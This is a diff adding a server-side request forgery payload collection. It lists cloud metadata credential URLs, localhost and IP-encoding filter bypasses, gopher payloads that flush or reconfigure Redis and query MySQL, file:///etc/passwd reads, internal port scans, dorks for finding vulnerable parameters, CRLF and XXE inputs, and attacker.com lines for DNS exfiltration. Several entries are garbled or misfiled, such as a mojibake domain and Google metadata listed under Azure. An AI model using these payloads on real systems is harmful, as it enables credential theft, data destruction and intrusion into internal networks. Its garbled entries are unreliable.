@@ -1,0 +1,288 @@
+# SSRF Payloads - Comprehensive Collection
+# Version: 1.0.17-20260301-Minggu-1738-WIB
+# Category: Server-Side Request Forgery
+
+# ============================================
+# BASIC SSRF
+# ============================================
+
+http://localhost/
+http://127.0.0.1/
+http://0.0.0.0/
+http://[::1]/
+http://localhost:22/
+http://localhost:80/
+http://localhost:443/
+http://127.0.0.1:22/
+http://127.0.0.1:80/
+http://127.0.0.1:443/
+
+# ============================================
+# CLOUD METADATA
+# ============================================
+
+# AWS
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/ami-id/
+http://169.254.169.254/latest/meta-data/instance-id/
+http://169.254.169.254/latest/meta-data/hostname/
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/instance?api-version=2017-08-01
+http://metadata.google.internal/computeMetadata/v1/
+
+# GCP
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1.json
+
+# Kubernetes
+http://kubernetes.default.svc/
+http://kubernetes.default/
+
+# ============================================
+# BYPASSING LOCALHOST
+# ============================================
+
+127.0.0.1
+localhost
+0.0.0.0
+::1
+127.1
+127.2
+127.3
+127.0.1
+127.0.0.2
+127.0.0.3
+127.1.1.1
+2130706433 (decimal)
+0x7F000001 (hex)
+0177.0000.0000.0001 (octal)
+localhost.localdomain
+metadata.google.internal
+
+# ============================================
+# DNS REBINDING
+# ============================================
+
+# First request to attacker-controlled DNS
+# Second request to internal IP after TTL expires
+
+# Tools: dnsrebinder, singOfAttack
+
+# ============================================
+# BYPASSING FILTERS
+# ============================================
+
+# Decimal IP
+http://2130706433/
+http://3232235777/
+
+# Hex IP
+http://0x7f000001/
+
+# IPv6 IPv4 mapped
+http://[::ffff:127.0.0.1]/
+http://[0:0:0:0:0:ffff:127.0.0.1]/
+
+# Alternate encoding
+http://127。0。0。1/
+http://127．0．0．1/
+http://127.0.0.1.@/
+
+# IDN Domain
+http://localhost。com
+http://�本地 HOST .com
+
+# URL parsing bypass
+http://evil.com@127.0.0.1
+http://127.0.0.1.evil.com
+http://127。0.0.1
+http://127@127.0.0.1
+
+# ============================================
+# GOPHER PROTOCOL
+# ============================================
+
+gopher://127.0.0.1:6379/_INFO
+gopher://127.0.0.1:6379/_FLUSHALL
+gopher://127.0.0.1:6379/_CONFIG SET dir /tmp
+gopher://127.0.0.1:6379/_SET foo bar
+
+gopher://127.0.0.1:3306/_SELECT%20*%20FROM%20users
+
+# ============================================
+# DICT PROTOCOL
+# ============================================
+
+dict://localhost:11211/stats
+dict://localhost:11211/get:key
+
+# ============================================
+# FILE PROTOCOL
+# ============================================
+
+file:///etc/passwd
+file:///C:/Windows/win.ini
+
+# ============================================
+# LDAP
+# ============================================
+
+ldap://localhost:389/
+ldap://127.0.0.1:389/
+
+# ============================================
+# SMTP
+# ============================================
+
+http://127.0.0.1:25/
+http://localhost:25/
+
+# ============================================
+# INTERNAL SCAN
+# ============================================
+
+# Port scanning via SSRF
+http://127.0.0.1:22/
+http://127.0.0.1:3306/
+http://127.0.0.1:5432/
+http://127.0.0.1:6379/
+http://127.0.0.1:8080/
+http://127.0.0.1:8443/
+
+# Internal network
+http://192.168.1.1/
+http://10.0.0.1/
+http://172.16.0.1/
+
+# ============================================
+# AWS SPECIFIC
+# ============================================
+
+http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/meta-data/
+http://metadata.googleusercontent.com/computeMetadata/v1/
+
+# ============================================
+# GOOGLE DORK SSRF
+# ============================================
+
+inurl:*.google.com/*&output=
+inurl:&url=
+inurl:dest=
+inurl:redirect_uri=
+inurl:return_url=
+inurl:returnUrl=
+inurl:next=
+inurl:data=
+inurl:reference=
+inurl:site=
+inurl:html=
+inurl:val=
+inurl:validate=
+inurl:domain=
+inurl:callback=
+inurl:return=
+inurl:page=
+inurl:feed=
+inurl:host=
+inurl:port=
+inurl:to=
+inurl:out=
+inurl:view=
+inurl:dir=
+inurl:show=
+inurl:navigate=
+inurl:open=
+inurl:page=
+inurl:document=
+inurl:folder=
+inurl:pg=
+inurl:style=
+inurl:doc=
+inurl:img=
+inurl:source=
+inurl:url=
+inurl:download=
+inurl:go=
+inurl:escape=
+
+# ============================================
+# PROTOCOL SMUGGLING
+# ============================================
+
+# HTTP smuggling via URL
+http://attacker.com/http://internal/
+http://attacker.com/https://internal/
+
+# Double URL encoding
+http://%6c%6f%63%61%6c%68%6f%73%74/
+
+# ============================================
+# CRLF INJECTION
+# ============================================
+
+http://attacker.com/%0D%0AInject
+http://attacker.com/%0ASet-Cookie:session=hacked
+
+# ============================================
+# XXE + SSRF
+# ============================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "http://internal-server/secret">
+]>
+<foo>&xxe;</foo>
+
+# ============================================
+# BLIND SSRF
+# ============================================
+
+# Use DNS exfiltration
+http://attacker.com/?subdomain=INTERNAL-IP.attacker.com
+http://attacker.com/?url=http://internal/
+
+# Time-based blind SSRF
+http://127.0.0.1?sleep=10
+
+# ============================================
+# AWS METADATA ENDPOINTS
+# ============================================
+
+/latest/meta-data/
+/latest/meta-data/ami-id
+/latest/meta-data/ami-launch-index
+/latest/meta-data/ami-manifest-path
+/latest/meta-data/block-device-mapping/ami
+/latest/meta-data/block-device-mapping/ephemeral0
+/latest/meta-data/block-device-mapping/root
+/latest/meta-data/events/
+/latest/meta-data/hostname
+/local-hostname
+/local-ipv4
+/mac
+/metadata/
+/network/
+/primary-ipv4
+/public-keys/0/openssh-key
+/reservation-id
+/security-groups
+
+# ============================================
+# AZURE METADATA
+# ============================================
+
+/metadata/instance?api-version=2021-02-01
+/metadata/instance/compute
+/metadata/instance/network/interface
+/metadata/instance/customData
+
